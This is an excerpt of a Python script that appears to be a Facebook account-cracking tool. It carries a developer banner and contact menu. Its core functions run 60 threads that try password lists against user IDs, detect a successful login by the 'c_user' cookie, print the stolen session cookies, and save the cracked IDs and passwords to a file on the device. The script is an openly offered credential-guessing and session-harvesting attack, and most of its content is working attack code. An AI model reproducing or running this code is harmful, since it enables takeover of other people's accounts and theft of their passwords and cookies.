...
{RX}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{R}[{B}={R}] {G}DEVELOPER  {RX} ⬤{G}  𝙴𝙱𝚁𝙰𝙷𝙸𝙼 {R}[{I}ғғ~ʟᴏᴠᴇʀ{R}]
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/+8801322493788');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://facebook.com/groups/822977329469096/');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://github.com/BLACK-505');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def virusA():
	...
	with ThreadPool(max_workers=60) as yaari:
		...
		print('\033[38;5;46m┗━[•] \033[38;5;46mIM Free Fire Lover ')
		line()
		for guru in user:
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[{I}EBRA 😺\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\r\033[1;32m {X}[{G}EBRA-😺{X}]{G} {cid} {X}|{G} '+ps)
                print('\r\033[1;37m [🍪] COOKIES :- '+coki)
                oks.append(cid)
                open('/sdcard/Ebra-😺.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
